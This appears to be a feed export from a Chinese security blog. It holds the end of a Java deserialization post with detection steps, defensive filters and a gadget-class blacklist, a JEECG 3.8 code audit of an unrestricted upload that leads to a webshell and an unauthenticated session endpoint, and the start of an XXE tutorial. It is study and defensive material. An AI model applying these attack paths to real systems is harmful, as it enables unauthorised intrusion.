2.3.9</span><br><span class="line">org.springframework:spring-aop 4.1.4.RELEASE</span><br></pre></td></tr></table></figure><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>反序列化操作一般应用在导入模板文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘、或DB存储等业务场景。</p><h3 id="白盒检测"><a href="#白盒检测" class="headerlink" title="白盒检测"></a>白盒检测</h3><p><strong>① 通过检索源码中对反序列化函数的调用来静态寻找反序列化的输入点</strong></p><ul><li>搜索以下函数：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject</span><br><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject</span><br><span class="line">Yaml.load</span><br><span class="line">XStream.fromXML</span><br><span class="line">ObjectMapper.readValue</span><br><span class="line">JSON.parseObject</span><br></pre></td></tr></table></figure><p><strong>② 确定了反序列化输入点后，再考察应用的<code>Class Path</code>中是否包含<code>Apache Commons Collections</code>等危险库（ysoserial所支持的其他库亦可）。</strong><br><strong>③ 若不包含危险库，则查看一些涉及命令、代码执行的代码区域，防止程序员代码不严谨，导致bug。</strong><br><strong>④ 若包含危险库，则使用<a href="https://github.com/frohoff/ysoserial">ysoserial</a>进行攻击复现。</strong></p><h3 id="黑盒检测"><a href="#黑盒检测" class="headerlink" title="黑盒检测"></a>黑盒检测</h3><ul><li>通过抓包来检测请求中可能存在的序列化数据。</li><li>序列化数据通常以<code>AC ED</code>开始，之后的两个字节是版本号，版本号一般是<code>00 05</code>，<code>AC ED 00 05</code>经过<code>Base64</code>编码之后为<code>rO0AB</code></li><li>十六进制对照表：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x70 - TC_NULL</span><br><span class="line">0x71 - TC_REFERENCE</span><br><span class="line">0x72 - TC_CLASSDESC</span><br><span class="line">0x73 - TC_OBJECT</span><br><span class="line">0x74 - TC_STRING</span><br><span class="line">0x75 - TC_ARRAY</span><br><span class="line">0x76 - TC_CLASS</span><br><span class="line">0x7B - TC_EXCEPTION</span><br><span class="line">0x7C - TC_LONGSTRING</span><br><span class="line">0x7D - TC_PROXYCLASSDESC</span><br><span class="line">0x7E - TC_ENUM</span><br></pre></td></tr></table></figure><p>可以通过tcpdump抓取TCP&#x2F;HTTP请求，通过<a href="https://github.com/NickstaDB/SerialBrute/">SerialBrute.py</a>去自动化检测，并插入<a href="https://github.com/frohoff/ysoserial">ysoserial</a>生成的<code>exp</code></p><h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><h4 id="通过Hook-resolveClass来校验反序列化的类"><a href="#通过Hook-resolveClass来校验反序列化的类" class="headerlink" title="通过Hook resolveClass来校验反序列化的类"></a>通过Hook resolveClass来校验反序列化的类</h4><p>在readObject反序列化时首先会调用resolveClass读取反序列化的类名，所以这里通过重写ObjectInputStream对象的resolveClass方法即可实现对反序列化类的校验。通过此方法，可灵活的设置允许反序列化类的白名单，也可设置不允许反序列化类的黑名单。但反序列化漏洞利用方法一直在不断的被发现，黑名单需要一直更新维护，且未公开的利用方法无法覆盖。</p><p>检测示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public class AntObjectInputStream extends ObjectInputStream&#123;</span><br><span class="line">    public AntObjectInputStream(InputStream inputStream)</span><br><span class="line">            throws IOException &#123;</span><br><span class="line">        super(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 只允许反序列化SerialObject class</span><br><span class="line">     */</span><br><span class="line">    @Override</span><br><span class="line">    protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException,</span><br><span class="line">            ClassNotFoundException &#123;</span><br><span class="line">        if (!desc.getName().equals(SerialObject.class.getName())) &#123;</span><br><span class="line">            throw new InvalidClassException(</span><br><span class="line">                    &quot;Unauthorized deserialization attempt&quot;,</span><br><span class="line">                    desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        return super.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="使用ValidatingObjectInputStream来校验反序列化的类"><a href="#使用ValidatingObjectInputStream来校验反序列化的类" class="headerlink" title="使用ValidatingObjectInputStream来校验反序列化的类"></a>使用ValidatingObjectInputStream来校验反序列化的类</h4><p>使用<code>Apache Commons IO Serialization</code>包中的<code>ValidatingObjectInputStream</code>类的accept方法来实现反序列化类白&#x2F;黑名单控制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">private static Object deserialize(byte[] buffer) throws IOException,</span><br><span class="line">ClassNotFoundException , ConfigurationException &#123;</span><br><span class="line">Object obj;</span><br><span class="line">ByteArrayInputStream bais = new ByteArrayInputStream(buffer);</span><br><span class="line">// Use ValidatingObjectInputStream instead of InputStream</span><br><span class="line">ValidatingObjectInputStream ois = new ValidatingObjectInputStream(bais); </span><br><span class="line"></span><br><span class="line">//只允许反序列化SerialObject class</span><br><span class="line">ois.accept(SerialObject.class);</span><br><span class="line">obj = ois.readObject();</span><br><span class="line">return obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="使用ObjectInputFilter来校验反序列化的类"><a href="#使用ObjectInputFilter来校验反序列化的类" class="headerlink" title="使用ObjectInputFilter来校验反序列化的类"></a>使用ObjectInputFilter来校验反序列化的类</h4><p>Java 9包含了支持序列化数据过滤的新特性，开发人员也可以继承<a href="http://download.java.net/java/jdk9/docs/api/java/io/ObjectInputFilter.html">java.io.ObjectInputFilter</a>类重写checkInput方法实现自定义的过滤器，并使用ObjectInputStream对象的<a href="http://download.java.net/java/jdk9/docs/api/java/io/ObjectInputStream.html#setObjectInputFilter-java.io.ObjectInputFilter-">setObjectInputFilter</a>设置过滤器来实现反序列化类白&#x2F;黑名单控制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import java.util.List;</span><br><span class="line">import java.util.Optional;</span><br><span class="line">import java.util.function.Function;</span><br><span class="line">import java.io.ObjectInputFilter;</span><br><span class="line">class BikeFilter implements ObjectInputFilter &#123;</span><br><span class="line">private long maxStreamBytes = 78; // Maximum allowed bytes in the stream.</span><br><span class="line">private long maxDepth = 1; // Maximum depth of the graph allowed.</span><br><span class="line">private long maxReferences = 1; // Maximum number of references in a graph.</span><br><span class="line">@Override</span><br><span class="line">public Status checkInput(FilterInfo filterInfo) &#123;</span><br><span class="line">if (filterInfo.references() &lt; 0 || filterInfo.depth() &lt; 0 || filterInfo.streamBytes() &lt; 0 || filterInfo.references() &gt; maxReferences || filterInfo.depth() &gt; maxDepth|| filterInfo.streamBytes() &gt; maxStreamBytes) &#123;</span><br><span class="line">return Status.REJECTED;</span><br><span class="line">&#125;</span><br><span class="line">Class&lt;?&gt; clazz = filterInfo.serialClass();</span><br><span class="line">if (clazz != null) &#123;</span><br><span class="line">if (SerialObject.class == filterInfo.serialClass()) &#123;</span><br><span class="line">return Status.ALLOWED;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">return Status.REJECTED;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return Status.UNDECIDED;</span><br><span class="line">&#125; // end checkInput</span><br><span class="line">&#125; // end class BikeFilter</span><br></pre></td></tr></table></figure><h4 id="黑名单校验修复"><a href="#黑名单校验修复" class="headerlink" title="黑名单校验修复"></a>黑名单校验修复</h4><ul><li>org.apache.commons.collections.functors.InvokerTransformer</li><li>org.apache.commons.collections.functors.InstantiateTransformer</li><li>org.apache.commons.collections4.functors.InvokerTransformer</li><li>org.apache.commons.collections4.functors.InstantiateTransformer</li><li>org.codehaus.groovy.runtime.ConvertedClosure</li><li>org.codehaus.groovy.runtime.MethodClosure</li><li>org.springframework.beans.factory.ObjectFactory</li><li>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</li><li>org.apache.commons.fileupload</li><li>org.apache.commons.beanutils</li><li>…</li></ul><h4 id="安全编码建议"><a href="#安全编码建议" class="headerlink" title="安全编码建议"></a>安全编码建议</h4><ul><li>更新commons-collections、commons-io等第三方库版本；</li><li>业务需要使用反序列化时，尽量避免反序列化数据可被用户控制，如无法避免建议尽量使用白名单校验的修复方式；</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/tree_ifconfig/article/details/82766587">https://blog.csdn.net/tree_ifconfig/article/details/82766587</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/14127885.html">https://www.cnblogs.com/nice0e3/p/14127885.html</a></p><p><a href="https://www.cnblogs.com/yyhuni/p/14755940.html">https://www.cnblogs.com/yyhuni/p/14755940.html</a></p><p><a href="https://github.com/Cryin/Paper/blob/master/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8:JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%AE%87.md">https://github.com/Cryin/Paper/blob/master/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8:JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%AE%87.md</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h2 id=&quot;序列化与反序列化基础&quot;&gt;&lt;a href=&quot;#序列化与反序列化基础&quot; class=&quot;headerlink&quot; title=&quot;序列化与反序列化基础&quot;&gt;&lt;/a&gt;序列化与反序列化基础&lt;/h2&gt;&lt;h3 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h3&gt;&lt;p&gt;Java序列化是指把Java对象转换为字节序列的过程；&lt;/p&gt;
&lt;p&gt;Java反序列化是指把字节序列恢复为Java对象的过程；&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="反序列化" scheme="https://kpa1on.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>JEECG代码审计之文件上传</title>
    <link href="https://kpa1on.github.io/2022/03/21/JEECG%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://kpa1on.github.io/2022/03/21/JEECG%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2022-03-21T15:03:05.000Z</published>
    <updated>2022-03-21T18:08:57.148Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>JEECG（J2EE Code Generation）是一款基于代码生成器JEE的智能开发平台。引领新的开发模式(Online Coding-&gt;代码生成器-&gt;手工MERGE智能开发)，可以帮助解决Java项目90%的重复工作，让开发更多关注业务逻辑。既能快速提高开发效率，帮助公司节省人力成本，同时又不失灵活性。</p><span id="more"></span><p>采用SpringMVC + Hibernate + Minidao(类Mybatis) + Easyui(UI库)+ Jquery + Boostrap + Ehcache + Redis + Ztree + Vue + Boostrap-table + ElementUI等基础架构</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li>mysql5.7</li><li>IDEA</li><li>jdk1.8</li><li>navicat</li><li>tomcat8</li><li>jeecg3.8：<a href="https://github.com/chen-tj/jeecg3.8">https://github.com/chen-tj/jeecg3.8</a></li></ul><p>下载源码，导入IDEA，刷新maven</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321230716606-1233901893.png" alt="image-20220321230716028"></p><p>创建jeecg数据库，修改数据库配置文件</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321230803568-2109007214.png" alt="image-20220321230803872"></p><p>navicat导入sql文件</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321232942735-373122190.png" alt="image-20220321232942517"></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321233013717-1571466095.png" alt="image-20220321233012479"></p><p>配置tomcat8启动，试了tomcat9发现报错</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321234119767-1206559945.png" alt="image-20220321234119733"></p><p>启动完成后，访问<a href="http://localhost:8080/jeecg_war_exploded/loginController.do?login">http://localhost:8080/jeecg_war_exploded/loginController.do?login</a></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321234044205-332817464.png" alt="image-20220321234043921"></p><h2 id="路由简介"><a href="#路由简介" class="headerlink" title="路由简介"></a>路由简介</h2><p>JEECG快速开发平台基于spring MVC 框架，以下就是常见的注解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">一、组件型注解：</span><br><span class="line">@Component：在类定义之前添加@Component注解，他会被spring容器识别，并转为bean。</span><br><span class="line">@Repository：对Dao实现类进行注解 (特殊的@Component)</span><br><span class="line">@Service：用于对业务逻辑层进行注解， (特殊的@Component)</span><br><span class="line">@Controller：用于控制层注解 ， (特殊的@Component)</span><br><span class="line">以上四种注解都是注解在类上的，被注解的类将被spring初始话为一个bean，然后统一管理。</span><br><span class="line">二、请求和参数型注解：</span><br><span class="line">@RequestMapping：用于处理请求地址映射，可以作用于类和方法上。</span><br><span class="line">value：定义request请求的映射地址</span><br><span class="line">method：定义地request址请求的方式，包括【GET, POST, DELETE ...】默认接受get请求，如果请求方式和定义的方式不一样则请求无法成功。</span><br><span class="line">params：定义request请求中必须包含的参数值。</span><br><span class="line">headers：定义request请求中必须包含某些指定的请求头，如：RequestMapping(value = &quot;/something&quot;, headers = &quot;content-type=text/*&quot;)说明请求中必须要包含&quot;text/html&quot;, &quot;text/plain&quot;这中类型的Content-type头，才是一个匹配的请求。</span><br><span class="line">consumes：定义请求提交内容的类型。</span><br><span class="line">produces：指定返回的内容类型，仅当request请求头中的(Accept)类型中包含该指定类型才返回</span><br><span class="line">@RequestParam：用于获取传入参数的值</span><br><span class="line">value：参数的名称</span><br><span class="line">required：定义该传入参数是否必须，默认为true，（和@RequestMapping的params属性有点类似）</span><br><span class="line">@PathViriable：用于定义路径参数值</span><br><span class="line">value：参数的名称</span><br><span class="line">required：定义传入参数是否为必须值</span><br><span class="line">@ResponseBody：作用于方法上，可以将整个返回结果以某种格式返回，如json或xml格式。</span><br><span class="line">@CookieValue：用于获取请求的Cookie值</span><br><span class="line">@ModelAttribute：用于把参数保存到model中，可以注解方法或参数，注解在方法上的时候，该方法将在处理器方法执行之前执行，然后把返回的对象存放在 session（前提时要有@SessionAttributes注解） 或模型属性中，@ModelAttribute(“attributeName”) 在标记方法的时候指定，若未指定，则使用返回类型的类名称（首字母小写）作为属性名称</span><br><span class="line">@SessionAttributes：可以使得模型中的数据存储一份到session域中。配合@ModelAttribute(&quot;user&quot;)使用的时候,会将对应的名称的model值存到session中</span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登陆后台后，访问：<a href="http://localhost:8080/jeecg_war_exploded/jeecgFormDemoController.do?commonUpload">http://localhost:8080/jeecg_war_exploded/jeecgFormDemoController.do?commonUpload</a></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322012447332-349201622.png" alt="image-20220322012447636"></p><p>上传文件，抓包改名</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322013904705-1361042337.png" alt="image-20220322013904920"></p><p>冰蝎连接成功</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322013928618-3762562.png" alt="image-20220322013928988"></p><p>这里还存在一个未授权访问的漏洞</p><p><a href="http://localhost:8080/jeecg_war_exploded/webpage/system/druid/websession.json">http://localhost:8080/jeecg_war_exploded/webpage/system/druid/websession.json</a></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322020826940-1411269063.png" alt="image-20220322020827359"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>通过url地址<a href="http://127.0.0.1:8080/jeecg_war_exploded/cgUploadController.do?ajaxSaveFile&amp;sessionId=%E5%AF%BB%E6%89%BE%E6%8E%A7%E5%88%B6%E5%99%A8%EF%BC%8C%E5%85%A8%E5%B1%80%E6%90%9C%E7%B4%A2%60@RequestMapping(&quot;/cgUploadController&quot;)%60">http://127.0.0.1:8080/jeecg_war_exploded/cgUploadController.do?ajaxSaveFile&amp;sessionId=寻找控制器，全局搜索`@RequestMapping(&quot;/cgUploadController&quot;)`</a></p><p>定位<code>\src\main\java\org\jeecgframework\web\cgform\controller\upload\CgUploadController.java</code>，在<code>cgUploadController.do</code>后面还跟了参数<code>ajaxSaveFile</code>，我们当前这个<code>CgUploadController.java</code>中搜索<code>ajaxSaveFile</code>，定位到如下代码：</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322015102312-1853945584.png" alt="image-20220322015102321"></p><p>可以看到上传文件没有判断文件名后缀，直接调用<code>write2Disk</code>函数</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322015441385-3605746.png" alt="image-20220322015441618"></p><p>看下<code>write2Disk</code>函数，改函数传递三个参数，第一个为文件对象，第二个为文件拓展名，第三个为文件保存的路径，函数首先判断<code>extend</code>也就是拓展名是不是txt</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322015718001-648888386.png" alt="image-20220322015717181"></p><p>因为这里我们上传的是jsp，所以走的是else语句，代码如下：</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322015847500-798806028.png" alt="image-20220322015847752"></p><p>直接调用<code>FileCopyUtils#copy</code>方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FileCopyUtils.copy(mf.getBytes(), savefile);</span><br></pre></td></tr></table></figure><p>继续跟进<code>copy</code>函数，代码的意思是将文件的二进制数组转换成字节数组输入流，然后定义一个输出流<code>outStream</code>，将两个当做参数调用另一个copy方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322020047955-320794890.png" alt="image-20220322020048358"></p><p>看到这个copy函数的代码，就很明显了，就是将文件输入流中的内容拷贝到输出流中，也就是将上传的文件保存到指定的路径中</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322020419713-1082894079.png" alt="image-20220322020420167"></p><p>接着往下</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322020629867-522980796.png" alt="image-20220322020630209"></p><p>最后跟进到这个copy方法中，完成输入流到输出流的拷贝</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322020653035-220191673.png" alt="image-20220322020653434"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/mV4GNI9O4a1pT3ve3Mt75Q">https://mp.weixin.qq.com/s/mV4GNI9O4a1pT3ve3Mt75Q</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h2 id=&quot;简述&quot;&gt;&lt;a href=&quot;#简述&quot; class=&quot;headerlink&quot; title=&quot;简述&quot;&gt;&lt;/a&gt;简述&lt;/h2&gt;&lt;p&gt;JEECG（J2EE Code Generation）是一款基于代码生成器JEE的智能开发平台。引领新的开发模式(Online Coding-&amp;gt;代码生成器-&amp;gt;手工MERGE智能开发)，可以帮助解决Java项目90%的重复工作，让开发更多关注业务逻辑。既能快速提高开发效率，帮助公司节省人力成本，同时又不失灵活性。&lt;/p&gt;</summary>
    
    
    
    <category term="代码审计" scheme="https://kpa1on.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="代码审计" scheme="https://kpa1on.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="文件上传" scheme="https://kpa1on.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞学习</title>
    <link href="https://kpa1on.github.io/2022/03/21/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>https://kpa1on.github.io/2022/03/21/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-03-21T09:26:12.000Z</published>
    <updated>2022-03-21T13:50:12.803Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="XXE基础"><a href="#XXE基础" class="headerlink" title="XXE基础"></a>XXE基础</h2><h3 id="XXE概述"><a href="#XXE概述" class="headerlink" title="XXE概述"></a>XXE概述</h3><p>XXE（XML External Entity Injection）即XML外部实体注入。漏洞是在对不安全的外部实体数据进行处理时引发的安全问题。</p><span id="more"></span><h4 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h4><p>XML是可扩展的标记语言（eXtensible Markup Language），设计用来进行数据的传输和存储。</p><h5 id="文档结构"><a href="#文档结构" class="headerlink" title="文档结构"></a>文档结构</h5><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;  //XML声明</span><br><span class="line">&lt;!DOCTYPE note [     //文档类型定义</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;         //文档元素</span><br><span class="line">  &lt;to&gt;George&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><h5 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h5><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p><h5 id="DTD声明"><a href="#DTD声明" class="headerlink" title="DTD声明"></a>DTD声明</h5><p>内部声明：<!DOCTYPE 根元素 [元素声明] ></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;George&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>外部声明：<!DOCTYPE 根元素 SYSTEM "文件名"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;http://127.0.0.1/note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt; </span><br><span class="line"> </span><br><span class="line">--------------------------------------------------------------------</span><br><span class="line">#http://127.0.0.1/note.dtd的内容为</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><h5 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h5><p>构成DTD的叫做DTD实体，包括内部实体和外部实体。</p><p>内部和外部实体中，又有一般实体和参数实体</p><ul><li>一般实体： 引用方式：&amp;实体名；</li><li>参数实体： 引用方式：%实体名；</li></ul><p>注意参数实体只能在DTD中申明，DTD中引用；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY normal    &quot;hello&quot;&gt;     &lt;!-- 内部一般实体 --&gt;</span><br><span class="line">    &lt;!ENTITY % normal2 &quot;hello&quot;&gt;     &lt;!-- 内部参数实体 --&gt;</span><br><span class="line">    &lt;!ENTITY normal3 SYSTEM &quot;http://xml.org/hhh.dtd&quot;&gt;    &lt;!-- 外部一般实体 --&gt;</span><br><span class="line">    &lt;!ENTITY % normal4 SYSTEM &quot;file:///1234.dtd&quot;&gt;        &lt;!-- 外部参数实体 --&gt;</span><br><span class="line">    %normal4;            &lt;!-- 引用参数实体 